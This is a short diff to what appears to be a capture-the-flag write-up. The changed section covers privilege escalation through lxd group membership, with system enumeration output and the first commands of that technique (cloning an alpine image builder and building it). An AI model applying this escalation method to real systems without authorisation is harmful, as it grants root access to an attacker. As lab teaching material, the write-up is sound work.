@@ -219,16 +219,14 @@ Now let's move to PrivEsc
 ### PrivEsc
 
 Here we go lxd group
-```#!/usr/bin/env bash
+```bash
 
 ====================================( Basic information )=====================================
 OS: Linux version 4.15.0-99-generic (buildd@lcy01-amd64-013) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020
 User & Groups: uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
-```
 
 So let's move on to lxd privesc
 
-```bash
 git clone  https://github.com/saghul/lxd-alpine-builder.git
 cd lxd-alpine-builder
 ./build-alpine
